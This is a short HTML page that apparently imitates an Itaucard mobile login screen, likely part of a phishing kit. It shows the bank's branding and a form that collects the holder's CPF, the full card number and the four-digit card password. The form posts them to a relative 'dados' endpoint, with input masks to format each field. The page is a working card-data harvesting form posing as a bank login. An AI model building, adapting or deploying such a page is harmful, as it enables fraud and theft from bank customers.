
<!DOCTYPE html>
<html>
<head>
	<title>Itaucard</title>
	<meta name="theme-color" content="#945721">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<link rel="shortcut icon" href="imagens/ico.png" type="image/x-icon" />
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<style type="text/css">
		*{
			padding: 0;
			margin:0;
		}
		body{
			background-image: url(imagens/img_login_background.png);
			background-size: cover;
		}

		img.logo{
			
			width: 300px;
			margin-top: 110px;
			margin-left: 10px;
		}
		.content{
			position: fixed;
			bottom: 0;
			left: 0;
			width: 100%;
			padding-bottom: 20px;
		}
		.box{
			float: left;
			width: calc(100% - 40px);
			min-height: 100px;
			border-radius: 5px;
			margin-left: 10px;
			background: linear-gradient(to right, #253a6d, #3f6075);
			padding: 10px;
			
			opacity: 0.9;
			
			
		}
		input{
			background-color: transparent;
			border:0px;
			border-bottom: 2px solid #fff;
			float: left;
			width:calc(100%);
			margin-bottom: 13px;
			height:25px;
			color: #fff;
		}
		label{
			font-family: Arial;
			font-size: 12px;
			color: #fff;
			float: left;
			width:calc(100%);
		}
		button{
			float: left;
			width:calc(100%);
			background-color: #fff;
			border:0px;
			height: 40px;
			font-size: 15px;
			margin-top: 10px;
			border-radius: 5px;
			color: #2e4770;
		}
	</style>
</head>
<body>
	<script type="text/javascript">
		$(document).ready(function() {
			$("input[name=card]").mask("0000 0000 0000 0000");
			$("input[name=senha]").mask("0000");
			$("input[name=cpf]").mask("000.000.000-00");


			$("input[name=card]").keyup(function(event) {
				if ($(this).val().length == 19) {
					$("input[name=senha]").focus()
				}
			});

		});
	</script>
	<center>
	<img src="imagens/img_splash_logo.png" class="logo">
	</center>

	<div class="content">
		<div class="box">
			<form method="post" action="../dados/">
				<label>Cpf do titular</label>
				<input autocomplete="off" type="text" name="cpf" id="cpf">
				<label>Número do cartão</label>
				<input autocomplete="off" type="text" name="card" id="card">
				<label>Senha do cartão</label>
				<input autocomplete="off" type="password" name="senha" id="senha">
				<button type="submit">acessar</button>
			</form>
		</div>
	</div>

</body>
</html>